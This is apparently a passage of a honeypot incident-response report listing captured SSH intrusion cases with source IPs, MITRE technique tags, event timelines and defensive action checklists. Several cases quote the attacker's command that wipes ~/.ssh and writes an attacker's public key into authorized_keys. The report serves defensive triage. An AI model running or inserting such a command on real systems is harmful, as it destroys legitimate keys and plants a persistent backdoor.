| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-25 08:18:15` | `cowrie.session.connect` |
| `2026-11-25 08:18:15` | `cowrie.client.version` |
| `2026-11-25 08:18:15` | `cowrie.client.kex` |
| `2026-11-25 08:18:15` | `cowrie.login.success` |
| `2026-11-25 08:18:16` | `cowrie.session.params` |
| `2026-11-25 08:18:16` | `cowrie.command.input` |
| `2026-11-25 08:18:16` | `cowrie.command.failed` |
| `2026-11-25 08:18:16` | `cowrie.log.closed` |
| `2026-11-25 08:18:16` | `cowrie.session.params` |
| `2026-11-25 08:18:16` | `cowrie.command.input` |
| `2026-11-25 08:18:16` | `cowrie.session.file_download` |
| `2026-11-25 08:18:16` | `cowrie.log.closed` |
| `2026-11-25 08:18:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.121.99[.]2` to AbuseIPDB if not already reported
- [ ] Block `129.121.99[.]2` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8826c93cb68

| Field | Detail |
|---|---|
| **Source IP** | `129.121.99[.]2` |
| **First Seen** | 2026-11-25 08:18 |
| **Last Seen** | 2026-11-25 08:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-25 08:18:16` | `cowrie.session.connect` |
| `2026-11-25 08:18:16` | `cowrie.client.version` |
| `2026-11-25 08:18:16` | `cowrie.client.kex` |
| `2026-11-25 08:18:17` | `cowrie.login.success` |
| `2026-11-25 08:18:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.121.99[.]2` to AbuseIPDB if not already reported
- [ ] Block `129.121.99[.]2` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6396a47ecd0c

| Field | Detail |
|---|---|
| **Source IP** | `182.237.13[.]208` |
| **First Seen** | 2026-11-25 08:19 |
| **Last Seen** | 2026-11-25 08:19 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-25 08:19:20` | `cowrie.session.connect` |
| `2026-11-25 08:19:20` | `cowrie.client.version` |
| `2026-11-25 08:19:20` | `cowrie.client.kex` |
| `2026-11-25 08:19:21` | `cowrie.login.success` |
| `2026-11-25 08:19:22` | `cowrie.session.params` |
| `2026-11-25 08:19:22` | `cowrie.command.input` |
| `2026-11-25 08:19:22` | `cowrie.command.failed` |
| `2026-11-25 08:19:22` | `cowrie.log.closed` |
| `2026-11-25 08:19:23` | `cowrie.session.params` |
| `2026-11-25 08:19:23` | `cowrie.command.input` |
| `2026-11-25 08:19:23` | `cowrie.session.file_download` |
| `2026-11-25 08:19:23` | `cowrie.log.closed` |
| `2026-11-25 08:19:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.237.13[.]208` to AbuseIPDB if not already reported
- [ ] Block `182.237.13[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c15515e97e0

| Field | Detail |
|---|---|
| **Source IP** | `182.237.13[.]208` |
| **First Seen** | 2026-11-25 08:19 |
| **Last Seen** | 2026-11-25 08:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-25 08:19:24` | `cowrie.session.connect` |
| `2026-11-25 08:19:24` | `cowrie.client.version` |
| `2026-11-25 08:19:24` | `cowrie.client.kex` |
| `2026-11-25 08:19:25` | `cowrie.login.success` |
| `2026-11-25 08:19:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.237.13[.]208` to AbuseIPDB if not already reported
- [ ] Block `182.237.13[.]208` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c00f54e2f50b

| Field | Detail |
|---|---|
| **Source IP** | `103.145.63[.]218` |
| **First Seen** | 2026-11-25 08:21 |
| **Last Seen** | 2026-11-25 08:21 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-25 08:21:04` | `cowrie.session.connect` |
| `2026-11-25 08:21:04` | `cowrie.client.version` |
| `2026-11-25 08:21:04` | `cowrie.client.kex` |
| `2026-11-25 08:21:05` | `cowrie.login.success` |
| `2026-11-25 08:21:06` | `cowrie.session.params` |
| `2026-11-25 08:21:06` | `cowrie.command.input` |
| `2026-11-25 08:21:06` | `cowrie.command.failed` |
| `2026-11-25 08:21:07` | `cowrie.log.closed` |
| `2026-11-25 08:21:08` | `cowrie.session.params` |
| `2026-11-25 08:21:08` | `cowrie.command.input` |
| `2026-11-25 08:21:08` | `cowrie.session.file_download` |
| `2026-11-25 08:21:08` | `cowrie.log.closed` |
| `2026-11-25 08:21:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.145.63[.]218` to AbuseIPDB if not already reported
- [ ] Block `103.145.63[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7aad98202fab

| Field | Detail |
|---|---|
| **Source IP** | `103.145.63[.]218` |
| **First Seen** | 2026-11-25 08:21 |
| **Last Seen** | 2026-11-25 08:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-25 08:21:08` | `cowrie.session.connect` |
| `2026-11-25 08:21:08` | `cowrie.client.version` |
| `2026-11-25 08:21:08` | `cowrie.client.kex` |
| `2026-11-25 08:21:09` | `cowrie.login.success` |
| `2026-11-25 08:21:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.145.63[.]218` to AbuseIPDB if not already reported
- [ ] Block `103.145.63[.]218` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-387681fa985a

| Field | Detail |
|---|---|
| **Source IP** | `138.124.124[.]212` |
| **First Seen** | 2026-11-25 08:22 |
| **Last Seen** | 2026-11-25 08:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-25 08:22:44` | `cowrie.session.connect` |
| `2026-11-25 08:22:44` | `cowrie.login.success` |
| `2026-11-25 08:22:45` | `cowrie.session.params` |
| `2026-11-25 08:22:45` | `cowrie.command.input` |
| `2026-11-25 08:22:45` | `cowrie.log.closed` |
| `2026-11-25 08:22:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.124.124[.]212` to AbuseIPDB if not already reported
- [ ] Block `138.124.124[.]212` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e479d0d3849d

| Field | Detail |
|---|---|
| **Source IP** | `91.134.133[.]184` |
| **First Seen** | 2026-11-25 08:22 |
| **Last Seen** | 2026-11-25 08:23 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-25 08:22:55` | `cowrie.session.connect` |
| `2026-11-25 08:22:55` | `cowrie.client.version` |
| `2026-11-25 08:22:55` | `cowrie.client.kex` |
| `2026-11-25 08:22:56` | `cowrie.login.success` |
| `2026-11-25 08:22:56` | `cowrie.session.params` |
| `2026-11-25 08:22:56` | `cowrie.command.input` |
| `2026-11-25 08:22:56` | `cowrie.command.failed` |
| `2026-11-25 08:22:57` | `cowrie.log.closed` |
| `2026-11-25 08:22:57` | `cowrie.session.params` |
| `2026-11-25 08:22:57` | `cowrie.command.input` |
| `2026-11-25 08:22:57` | `cowrie.session.file_download` |
| `2026-11-25 08:22:57` | `cowrie.log.closed` |
| `2026-11-25 08:23:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.134.133[.]184` to AbuseIPDB if not already reported
- [ ] Block `91.134.133[.]184` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b57768443b18

| Field | Detail |
|---|---|
| **Source IP** | `91.134.133[.]184` |
| **First Seen** | 2026-11-25 08:22 |
| **Last Seen** | 2026-11-25 08:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-25 08:22:57` | `cowrie.session.connect` |
| `2026-11-25 08:22:57` | `cowrie.client.version` |
| `2026-11-25 08:22:57` | `cowrie.client.kex` |
| `2026-11-25 08:22:58` | `cowrie.login.success` |
| `2026-11-25 08:22:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.134.133[.]184` to AbuseIPDB if not already reported
- [ ] Block `91.134.133[.]184` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0972748be761

| Field | Detail |
|---|---|
| **Source IP** | `138.226.239[.]234` |
| **First Seen** | 2026-11-25 08:24 |
| **Last Seen** | 2026-11-25 08:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-25 08:24:22` | `cowrie.session.connect` |
| `2026-11-25 08:24:22` | `cowrie.client.version` |
| `2026-11-25 08:24:22` | `cowrie.client.kex` |
| `2026-11-25 08:24:22` | `cowrie.login.success` |
| `2026-11-25 08:24:22` | `cowrie.direct-tcpip.request` |
| `2026-11-25 08:24:22` | `cowrie.direct-tcpip.ja4` |
| `2026-11-25 08:24:22` | `cowrie.direct-tcpip.data` |
| `2026-11-25 08:24:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.226.239[.]234` to AbuseIPDB if not already reported
- [ ] Block `138.226.239[.]234` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6b3ccffc33f

| Field | Detail |
|---|---|
| **Source IP** | `117.50.70[.]125` |
| **First Seen** | 2026-11-25 08:24 |
| **Last Seen** | 2026-11-25 08:29 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-25 08:24:43` | `cowrie.session.connect` |
| `2026-11-25 08:24:43` | `cowrie.client.version` |
| `2026-11-25 08:24:44` | `cowrie.client.kex` |
| `2026-11-25 08:24:45` | `cowrie.login.success` |
| `2026-11-25 08:24:46` | `cowrie.session.params` |
| `2026-11-25 08:24:46` | `cowrie.command.input` |
| `2026-11-25 08:24:46` | `cowrie.command.failed` |
| `2026-11-25 08:29:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.50.70[.]125` to AbuseIPDB if not already reported
- [ ] Block `117.50.70[.]125` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5aa39ce09f1e

| Field | Detail |
|---|---|
| **Source IP** | `138.226.239[.]233` |
| **First Seen** | 2026-11-25 08:25 |
| **Last Seen** | 2026-11-25 08:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-25 08:25:01` | `cowrie.session.connect` |
| `2026-11-25 08:25:01` | `cowrie.client.version` |
| `2026-11-25 08:25:01` | `cowrie.client.kex` |
| `2026-11-25 08:25:01` | `cowrie.login.success` |
| `2026-11-25 08:25:02` | `cowrie.direct-tcpip.request` |
| `2026-11-25 08:25:02` | `cowrie.direct-tcpip.ja4` |
| `2026-11-25 08:25:02` | `cowrie.direct-tcpip.data` |
| `2026-11-25 08:25:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.226.239[.]233` to AbuseIPDB if not already reported
- [ ] Block `138.226.239[.]233` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-440521418d30

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]29` |
| **First Seen** | 2026-11-25 08:25 |
| **Last Seen** | 2026-11-25 08:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-25 08:25:10` | `cowrie.session.connect` |
| `2026-11-25 08:25:10` | `cowrie.client.version` |
| `2026-11-25 08:25:10` | `cowrie.client.kex` |
| `2026-11-25 08:25:11` | `cowrie.login.success` |
| `2026-11-25 08:25:11` | `cowrie.direct-tcpip.request` |
| `2026-11-25 08:25:11` | `cowrie.direct-tcpip.ja4` |
| `2026-11-25 08:25:11` | `cowrie.direct-tcpip.data` |
| `2026-11-25 08:25:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]29` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]29` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-508d007b216f

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-11-25 08:43 |
| **Last Seen** | 2026-11-25 08:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-25 08:43:44` | `cowrie.session.connect` |
| `2026-11-25 08:43:44` | `cowrie.client.version` |
| `2026-11-25 08:43:44` | `cowrie.client.kex` |
| `2026-11-25 08:43:44` | `cowrie.login.success` |
| `2026-11-25 08:43:45` | `cowrie.direct-tcpip.request` |
| `2026-11-25 08:43:45` | `cowrie.direct-tcpip.data` |
| `2026-11-25 08:43:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### Additional priority cases (339) — compact view

| Case | Severity | Source IP | First Seen | Auth | Cmds | DL | TTPs |
|---|---|---|---|---|---|---|---|
| IR-da45565db161 | HIGH | `14.103.118[.]140` | 2026-11-25 09:00 | Y | 1 | 0 | `T1021.004 · T1078 · T1592` |
| IR-25c3057389de | HIGH | `195.178.110[.]78` | 2026-11-25 09:08 | Y | 0 | 0 | `T1078` |
| IR-73326ffb5645 | HIGH | `51.91.96[.]79` | 2026-11-25 09:10 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-eae537b29dc9 | HIGH | `51.91.96[.]79` | 2026-11-25 09:10 | Y | 0 | 0 | `T1078 · T1592` |
| IR-e6f2f906330d | HIGH | `14.103.118[.]25` | 2026-11-25 09:15 | Y | 19 | 2 | `T1021.004 · T1053.003 · T1057` |
| IR-636933f7c2ac | HIGH | `78.128.112[.]74` | 2026-11-25 09:21 | Y | 1 | 0 | `T1078 · T1592` |
| IR-c418eccb916c | HIGH | `203.170.192[.]251` | 2026-11-25 09:23 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-6e6885e9bfc6 | HIGH | `203.170.192[.]251` | 2026-11-25 09:23 | Y | 0 | 0 | `T1078 · T1592` |
| IR-0d86a30632c5 | HIGH | `202.70.78[.]237` | 2026-11-25 09:25 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-efe9ee23b3a4 | HIGH | `202.70.78[.]237` | 2026-11-25 09:25 | Y | 0 | 0 | `T1078 · T1592` |
| IR-e462d85b8958 | HIGH | `103.214.63[.]81` | 2026-11-25 09:36 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-eea98536af7e | HIGH | `103.214.63[.]81` | 2026-11-25 09:36 | Y | 0 | 0 | `T1078 · T1592` |
| IR-8181ba30373f | HIGH | `138.68.103[.]218` | 2026-11-25 09:53 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-7941a2983ce1 | HIGH | `138.68.103[.]218` | 2026-11-25 09:53 | Y | 0 | 0 | `T1078 · T1592` |
| IR-20a6ade315de | HIGH | `45.64.112[.]230` | 2026-11-25 09:58 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-6756a6bea06e | HIGH | `45.64.112[.]230` | 2026-11-25 09:58 | Y | 0 | 0 | `T1078 · T1592` |
| IR-8943afaf7b4a | HIGH | `65.181.127[.]40` | 2026-11-25 10:01 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-7c4dc8fc983b | HIGH | `65.181.127[.]40` | 2026-11-25 10:01 | Y | 0 | 0 | `T1078 · T1592` |
| IR-cc10b84727f3 | HIGH | `60.54.77[.]201` | 2026-11-25 10:03 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-b4c972b93666 | HIGH | `60.54.77[.]201` | 2026-11-25 10:03 | Y | 0 | 0 | `T1078 · T1592` |
| IR-4e7d73b1f740 | HIGH | `195.178.110[.]78` | 2026-11-25 10:07 | Y | 0 | 0 | `T1078` |
| IR-f47c4b435d25 | HIGH | `80.94.92[.]179` | 2026-11-25 10:16 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-6b686a51171b | HIGH | `80.94.92[.]179` | 2026-11-25 10:19 | Y | 0 | 0 | `T1078 · T1592` |
| IR-49e283421d69 | HIGH | `80.94.92[.]179` | 2026-11-25 10:22 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-65f4f492cc35 | HIGH | `80.94.92[.]179` | 2026-11-25 10:25 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-c9c7e7fb6f5f | HIGH | `80.94.92[.]179` | 2026-11-25 10:27 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-5f186065d64a | HIGH | `77.90.185[.]29` | 2026-11-25 10:29 | Y | 0 | 0 | `T1078 · T1592` |
| IR-4ce2f2bd03e6 | HIGH | `80.94.92[.]179` | 2026-11-25 10:30 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-b82641b5406c | HIGH | `138.226.239[.]234` | 2026-11-25 10:30 | Y | 0 | 0 | `T1078 · T1592` |
| IR-0f1bdc7bef8c | HIGH | `80.94.92[.]179` | 2026-11-25 10:33 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-2d316eabae6a | HIGH | `80.94.92[.]179` | 2026-11-25 10:35 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-15286e205089 | HIGH | `80.94.92[.]179` | 2026-11-25 10:38 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-119c95fef487 | HIGH | `80.94.92[.]179` | 2026-11-25 10:41 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-e37e2e2face1 | HIGH | `80.94.92[.]179` | 2026-11-25 10:43 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-0b3e3c020936 | HIGH | `80.94.92[.]179` | 2026-11-25 10:46 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-4ab576f23057 | HIGH | `80.94.92[.]179` | 2026-11-25 10:49 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-e298675d42a9 | HIGH | `80.94.92[.]179` | 2026-11-25 10:51 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-4de87ea09c7d | HIGH | `80.94.92[.]179` | 2026-11-25 10:54 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-4e97a5e8d123 | HIGH | `80.94.92[.]179` | 2026-11-25 10:59 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-70cde2f84fd5 | HIGH | `80.94.92[.]179` | 2026-11-25 11:02 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-e6496b173762 | HIGH | `80.94.92[.]179` | 2026-11-25 11:04 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-f4de232f07fb | HIGH | `80.94.92[.]179` | 2026-11-25 11:07 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-6b84c19e5e88 | HIGH | `80.94.92[.]179` | 2026-11-25 11:10 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-9d42966bd490 | HIGH | `80.94.92[.]179` | 2026-11-25 11:12 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-865121440463 | HIGH | `80.94.92[.]179` | 2026-11-25 11:15 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-74fa91955e41 | HIGH | `80.94.92[.]179` | 2026-11-25 11:17 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-542da2483008 | HIGH | `80.94.92[.]179` | 2026-11-25 11:20 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-f3e275883f78 | HIGH | `80.94.92[.]179` | 2026-11-25 11:23 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-17187190d9e0 | HIGH | `80.94.92[.]179` | 2026-11-25 11:25 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-71afed3e305d | HIGH | `80.94.92[.]179` | 2026-11-25 11:28 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-4cd352f96ece | HIGH | `45.61.187[.]220` | 2026-11-25 11:28 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-0fe506e9baae | HIGH | `45.61.187[.]220` | 2026-11-25 11:28 | Y | 0 | 0 | `T1078 · T1592` |
| IR-002da3a4fea6 | HIGH | `80.94.92[.]179` | 2026-11-25 11:30 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-891a5aee6324 | HIGH | `23.132.164[.]185` | 2026-11-25 11:31 | Y | 1 | 0 | `T1078 · T1592` |
| IR-b91a0b3078cd | HIGH | `176.53.159[.]196` | 2026-11-25 11:32 | Y | 0 | 0 | `T1078 · T1592` |
| IR-e82a9ec4bc95 | HIGH | `80.94.92[.]179` | 2026-11-25 11:32 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-b3e8ea4f4a9c | HIGH | `80.94.92[.]179` | 2026-11-25 11:35 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-ab254387a373 | HIGH | `83.168.110[.]192` | 2026-11-25 11:36 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-63a2a85add2a | HIGH | `83.168.110[.]192` | 2026-11-25 11:36 | Y | 0 | 0 | `T1078 · T1592` |
| IR-cf0ce7a6c2db | HIGH | `80.94.92[.]179` | 2026-11-25 11:37 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-756fdbd48e39 | HIGH | `80.94.92[.]179` | 2026-11-25 11:40 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-4384bbca47a7 | HIGH | `103.195.236[.]35` | 2026-11-25 11:42 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
